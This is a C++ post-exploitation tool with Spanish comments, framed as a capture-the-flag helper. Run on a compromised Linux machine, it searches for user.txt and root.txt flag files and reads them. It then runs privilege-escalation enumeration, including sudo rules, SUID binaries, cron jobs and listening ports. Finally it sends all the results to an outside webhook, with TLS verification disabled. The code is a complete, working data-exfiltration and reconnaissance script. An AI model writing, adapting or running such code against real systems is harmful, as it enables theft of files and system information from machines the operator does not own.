/*
"The Exfil-Script" (Post-Explotación)
A veces obtienes una shell y pierdes tiempo buscando la flag.

La idea: Un pequeño script en Python (o un binario en C++ para que sea más ligero) que al ejecutarlo en la VM víctima busque automáticamente archivos con el formato user.txt o root.txt y te los mande por un webhook o un socket.

Extra: Que haga un LSE (Linux Smart Enumeration) resumido solo con lo que importa para escalar privilegios.

*/

// Compilación recomendada:
// g++ exfiltrator.cpp -o exfiltrator -lcurl
// ./exfiltrator <webhook_url>

#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>
#include <cstdio>
#include <memory>
#include <array>

using namespace std;

// Función para ejecutar comandos en Linux de forma segura y obtener el output
string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;
    // En Linux se usa popen, no _popen (que es de Windows)
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        return "Error al ejecutar comando.";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Función para escapar strings para JSON (reemplazar \n por \\n, comillas, etc)
string escapeJSON(const string& s) {
    string result;
    for (char c : s) {
        if (c == '\n') result += "\\n";
        else if (c == '\r') result += "\\r";
        else if (c == '\t') result += "\\t";
        else if (c == '\"') result += "\\\"";
        else if (c == '\\') result += "\\\\";
        else result += c;
    }
    return result;
}

void sendToWebhook(const string& url, const string& payload) {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL* curl = curl_easy_init();

    if (curl) {
        // Envolver el payload en el formato JSON esperado (ej. Discord)
        string json = "{\"content\":\"" + escapeJSON(payload) + "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Ignorar verificación SSL por si el target no tiene certificados actualizados
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            cerr << "Error enviando webhook: " << curl_easy_strerror(res) << endl;
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();
}

// Función mejorada para el LSE
string doLSE() {
    string lse_output = "\n**[ LSE RESUMIDO ]**\n";
    
    struct Command {
        string name;
        string cmd;
    };

    // Limitamos salidas con 'head' para que el webhook no rechace el payload por ser muy grande
    vector<Command> commands = {
        {"IP", "hostname -I"},
        {"Privilegios", "whoami"},
        {"Kernel Version", "uname -a"},
        {"Sudo Rules", "sudo -l 2>/dev/null"},
        {"SUID Binaries", "find / -perm -4000 -type f 2>/dev/null | head -n 15"},
        {"Cron Jobs", "crontab -l 2>/dev/null || cat /etc/crontab 2>/dev/null"},
        {"Puertos Internos", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"}
    };

    for (const auto& c : commands) {
        lse_output += "\n--- " + c.name + " ---\n";
        string res = exec(c.cmd.c_str());
        if (res.empty()) res = "No data/Access denied\n";
        lse_output += res;
    }

    return lse_output;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        cerr << "Usage: " << argv[0] << " <webhook_url>" << endl;
        return 1;
    }

    string webhookUrl = argv[1];
    string finalPayload = "**[ EXFILTRATION SCRIPT INICIADO ]**\n";

    // 1. Buscar las flags e intentar leerlas de una vez
    finalPayload += "\n**[ FLAGS ENCONTRADAS ]**\n";
    
    string userFlag = exec("find /home /root -name \"user.txt\" 2>/dev/null | xargs cat 2>/dev/null");
    if(!userFlag.empty()) finalPayload += "User.txt:\n" + userFlag + "\n";
    else finalPayload += "No se pudo leer user.txt\n";

    string rootFlag = exec("find /root /home -name \"root.txt\" 2>/dev/null | xargs cat 2>/dev/null");
    if(!rootFlag.empty()) finalPayload += "Root.txt:\n" + rootFlag + "\n";
    else finalPayload += "No se pudo leer root.txt\n";

    // 2. Hacer la enumeración
    finalPayload += doLSE();

    // 3. Enviar todo
    cout << "Enviando datos al webhook..." << endl;
    sendToWebhook(webhookUrl, finalPayload);
    cout << "Exfiltracion completada." << endl;

    return 0;
}
